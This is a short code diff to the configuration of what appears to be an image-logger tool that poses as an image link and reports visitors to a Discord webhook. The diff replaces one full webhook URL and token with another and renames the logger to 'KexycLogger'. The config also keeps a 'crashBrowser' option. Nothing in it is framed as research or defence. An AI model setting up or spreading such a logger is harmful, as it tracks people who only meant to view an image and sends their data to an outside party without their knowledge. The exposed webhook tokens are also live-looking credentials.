@@ -10,11 +10,11 @@ __version__ = "v2.0"
 __author__ = "@kexyc"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1425211812638621736/zF72k5B_XQ07fcCM6LpZ9enZ6rCBmG4xnfprwO7eN0DVgrgSzj6Xki08Vq0n25DiuAid",
+    "webhook": "https://discord.com/api/webhooks/1502035551753343168/40OzcbXsPy3Blx5T4tTi7H_BbCJ5lwHbGXkcTzOyoNdjQNY-R82GQKbHoH-ftWx8t55T",
     "image": "https://stickerly.pstatic.net/sticker_pack/eNrxqOuc388RTr1MVqOg/BKPGHG/16/61453289.png", 
     "imageArgument": True,
 
-    "username": "CABDIOLOGGER", 
+    "username": "KexycLogger", 
     "color": 0x00FFFF,
 
     "crashBrowser": False, 
